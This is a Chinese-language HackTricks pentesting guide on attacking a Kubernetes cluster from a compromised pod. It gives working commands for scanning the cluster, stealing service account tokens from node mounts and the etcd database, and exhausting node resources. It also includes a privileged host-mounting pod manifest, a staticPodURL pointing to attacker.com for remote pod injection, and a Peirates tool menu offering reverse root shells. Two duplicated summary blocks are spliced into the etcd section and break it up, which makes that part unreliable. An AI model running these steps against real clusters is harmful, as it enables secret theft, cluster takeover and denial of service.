# 从 Pod 内部攻击 Kubernetes

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## **Pod 突破**

**如果你足够幸运，你可能能够从中逃脱到节点：**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### 从 pod 逃脱

为了尝试从 pod 逃脱，你可能需要首先**提升权限**，一些提升权限的技术：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

你可以检查这些**docker 突破技术**来尝试从你已经攻破的 pod 逃脱：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### 滥用 Kubernetes 权限

如在**kubernetes 枚举**部分所解释的：

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

通常 pod 在其内部运行时会有一个**服务账户令牌**。这个服务账户可能有一些**附加的权限**，你可以**滥用**这些权限来**移动**到其他 pod，甚至**逃脱**到集群内配置的节点。查看如何操作：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 滥用云权限

如果 pod 在**云环境**内运行，你可能能够**泄露元数据端点的令牌**并使用它提升权限。

## 搜索易受攻击的网络服务

由于你在 Kubernetes 环境内，如果你不能通过滥用当前 pod 的权限提升权限，也不能从容器中逃脱，你应该**搜索潜在的易受攻击的服务。**

### 服务

**为此，你可以尝试获取 kubernetes 环境的所有服务：**
```
kubectl get svc --all-namespaces
```
默认情况下，Kubernetes 使用扁平网络架构，这意味着**集群内的任何 pod/服务都可以相互通信**。集群内的**命名空间**默认**没有任何网络安全限制**。命名空间内的任何人都可以与其他命名空间通信。

### 扫描

以下 Bash 脚本（摘自 [Kubernetes 工作坊](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)）将安装并扫描 kubernetes 集群的 IP 范围：
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
查看以下页面，了解如何**攻击 Kubernetes 特定服务**以**危害其他 pod/整个环境**：

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### 嗅探

如果**受损的 pod 运行着一些敏感服务**，其他 pod 需要认证，你可能能够通过**嗅探本地通信**获取从其他 pod 发送的凭据。

## 网络欺骗

默认情况下，像**ARP 欺骗**（因此也包括**DNS 欺骗**）这样的技术在 Kubernetes 网络中是有效的。因此，在 pod 内部，如果你拥有**NET_RAW 能力**（默认情况下就有），你将能够发送定制的网络数据包，并通过**ARP 欺骗对同一节点上运行的所有 pod 进行 MitM 攻击。**\
此外，如果**恶意 pod**运行在**与 DNS 服务器相同的节点上**，你将能够对**集群中所有 pod 进行 DNS 欺骗攻击**。

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## 节点 DoS

在 Kubernetes 清单中没有指定资源，也**没有应用**容器的限制范围。作为攻击者，我们可以**消耗 pod/部署运行的所有资源**，耗尽其他资源，导致环境 DoS。

这可以使用如 [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) 这样的工具来完成：
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
您可以看到运行`stress-ng`期间和之后的区别
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## 节点后期利用

如果你成功**逃离了容器**，你会在节点中发现一些有趣的东西：

* **容器运行时**进程（Docker）
* 更多在节点上运行的**pods/containers**，你可以像这样滥用它们（更多令牌）
* 完整的**文件系统**和**操作系统**通常
* 正在监听的**Kube-Proxy**服务
* 正在监听的**Kubelet**服务。检查配置文件：
* 目录：`/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* 其他**kubernetes常见文件**：
* `$HOME/.kube/config` - **用户配置**
* `/etc/kubernetes/kubelet.conf`- **常规配置**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **引导配置**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd配置**
* `/etc/kubernetes/pki` - **Kubernetes密钥**

### 查找节点kubeconfig

如果你在之前评论的路径中找不到kubeconfig文件，**检查kubelet进程的`--kubeconfig`参数**：
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### 窃取机密
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
脚本 [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) 将自动**获取其他 pod 的令牌并检查它们是否具有您正在寻找的权限**（而不是您一个接一个地查找）：
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### 特权 DaemonSets

DaemonSet 是一个将在**集群的所有节点上运行**的**pod**。因此，如果 DaemonSet 配置了一个**特权服务账户**，在**所有节点**中，你都可以找到那个**特权服务账户**的**令牌**，你可以滥用它。

利用方法与上一节相同，但现在你不再依赖运气。

### 转向云

如果集群由云服务管理，通常**节点将拥有与 Pod 不同的访问元数据**端点的权限。因此，尝试**从节点访问元数据端点**（或者从设置了 hostNetwork 为 True 的 pod 访问）：

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### 窃取 etcd

如果你可以指定将运行容器的 Node 的 [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)，进入控制平面节点的 shell 并获取**etcd 数据库**：
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane 节点具有 **role master**，在 **cloud managed clusters 中你将无法在它们上运行任何东西**。

#### 从 etcd 读取 secrets

如果你能够使用 pod 规范中的 `nodeName` 选择器在 control-plane 节点上运行你的 pod，你可能会很容易地访问 `etcd` 数据库，该数据库包含了集群的所有配置，包括所有 secrets。

以下是一个快速且简陋的方法，如果 `etcd` 正在你所在的 control-plane 节点上运行，可以从中抓取 secrets。如果你想要一个更优雅的解决方案，该方案会启动一个带有 `etcd` 客户端工具 `etcdctl` 的 pod，并使用 control-plane 节点的凭证连接到 etcd，无论它在哪里运行，请查看 @mauilion 提供的[这个示例清单](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)。

**检查 `etcd` 是否在 control-plane 节点上运行，并查看数据库的位置（这是在 `kubeadm` 创建的集群上）**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
# 从 Pod 内部攻击 Kubernetes

在 Kubernetes 环境中，攻击者可能会尝试从一个已经受控的 Pod 内部进一步攻击 Kubernetes 集群。以下是一些常见的攻击手段：

## 获取服务账户令牌

每个 Pod 都会自动挂载一个服务账户令牌。这个令牌可以用来与 Kubernetes API 服务器通信。攻击者可以通过以下命令获取这个令牌：

```
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## 列出环境变量

Pod 中可能包含敏感信息，如数据库密码或其他服务的凭证。这些信息可能会以环境变量的形式存在。使用以下命令列出环境变量：

```
env
```

## 访问 Kubernetes API

使用服务账户令牌，攻击者可以尝试访问 Kubernetes API 来发现更多信息。以下是一个使用 `curl` 访问 API 的例子：

```
curl -k https://kubernetes.default.svc.cluster.local/api --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

## 利用 RBAC 配置不当

如果 Role-Based Access Control (RBAC) 配置不当，攻击者可能会获得比他们应有权限更多的访问权。检查当前权限可以使用 `kubectl` 命令：

```
kubectl auth can-i --list
```

## 寻找未加密的敏感数据

在 Kubernetes 中，Secrets 应该用来存储敏感数据，如密码和 API 密钥。然而，如果 Secrets 没有得到适当的加密，它们可能会被泄露。使用以下命令列出所有 Secrets：

```
kubectl get secrets --all-namespaces
```

## 利用已知漏洞

Kubernetes 和运行在其上的应用程序可能会有已知的漏洞。攻击者可以利用这些漏洞来提升权限或执行其他恶意操作。定期检查和更新软件可以帮助减少这种风险。

通过这些技术，攻击者可以在 Kubernetes 环境中进行横向移动，寻找进一步攻击的机会。
```
```bash
data-dir=/var/lib/etcd
```
**查看 etcd 数据库中的数据：**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**从数据库中提取令牌并显示服务账户名称**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**相同的命令，但增加了一些 grep，仅返回 kube-system 命名空间中的默认令牌**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
# 从 Pod 内部攻击 Kubernetes

在 Kubernetes 环境中，攻击者可能会尝试从一个已经受控的 Pod 内部进一步攻击 Kubernetes 集群。以下是一些常见的攻击手段：

## 获取服务账户令牌

每个 Pod 都会自动挂载一个服务账户令牌。这个令牌可以用来与 Kubernetes API 服务器通信。要获取这个令牌，你可以执行以下命令：

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## 列出环境变量

Pod 中可能包含敏感信息，如数据库密码或其他服务的凭证。要列出所有环境变量，可以使用以下命令：

```bash
env
```

## 访问 Kubernetes API

使用服务账户令牌，攻击者可以尝试访问 Kubernetes API 来获取集群信息。以下是一个示例命令：

```bash
curl https://kubernetes.default.svc.cluster.local/api --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

## 利用 RBAC 配置不当

如果集群的 RBAC（Role-Based Access Control）配置不当，攻击者可能会获得比预期更多的权限。这可能导致对集群资源的未授权访问。

## 利用 etcd 泄露

etcd 是 Kubernetes 的键值存储，用于保存所有集群数据。如果 etcd 未正确配置和保护，攻击者可能会访问敏感数据。

## 利用未加固的节点

如果 Kubernetes 节点未经过适当加固，攻击者可能会利用节点上的漏洞来提升权限或进行其他恶意活动。

通过了解和利用这些技术，攻击者可以在 Kubernetes 环境中进行更深入的渗透测试。
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### 静态/镜像 Pods 持久性

_静态 Pods_ 是由特定节点上的 kubelet 守护进程直接管理的，API 服务器并不监视它们。与由控制平面管理的 Pods（例如，Deployment）不同；相反，**kubelet 会监视每个静态 Pod**（如果它失败了会重启它）。

因此，静态 Pods 总是**绑定到特定节点上的一个 Kubelet**。

**kubelet 会自动尝试在 Kubernetes API 服务器上为每个静态 Pod 创建一个镜像 Pod**。这意味着在节点上运行的 Pods 在 API 服务器上是可见的，但不能从那里控制。Pod 名称将以节点主机名为后缀，前面带有连字符。

{% hint style="danger" %}
静态 Pod 的 **`spec` 不能引用其他 API 对象**（例如，ServiceAccount, ConfigMap, Secret 等）。所以**你不能滥用这种行为在当前节点启动一个带有任意 serviceAccount 的 pod** 来妥协集群。但你可以使用它在不同的命名空间运行 pods（如果出于某种原因这有用的话）。
{% endhint %}

如果你在节点主机内部，你可以让它在自身内部创建一个**静态 pod**。这非常有用，因为它可能允许你**在不同的命名空间创建 pod**，如 **kube-system**。

为了创建一个静态 pod，[**文档提供了很大帮助**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)。你基本上需要两件事：

* 在 **kubelet 服务**中配置参数 **`--pod-manifest-path=/etc/kubernetes/manifests`**，或在 **kubelet 配置**中（[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)）并重启服务
* 在 **`/etc/kubernetes/manifests`** 中创建 **pod 定义**

**另一个更隐蔽的方法是：**

* 修改 **kubelet** 配置文件中的参数 **`staticPodURL`** 并设置类似 `staticPodURL: http://attacker.com:8765/pod.yaml`。这将使 kubelet 进程创建一个**静态 pod**，从指定的 URL 获取**配置**。

**示例**，**pod** 配置创建一个在 **kube-system** 中的特权 pod，取自[**这里**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)：
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### 删除 Pods + 不可调度节点

如果攻击者**危及了一个节点**，并且他能够从其他节点**删除 pods** 并**使其他节点无法执行 pods**，那么 pods 将在被危及的节点上重新运行，他将能够**窃取**在其中运行的 tokens。\
有关[**更多信息，请关注这些链接**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)。

## 自动化工具

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客技术！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
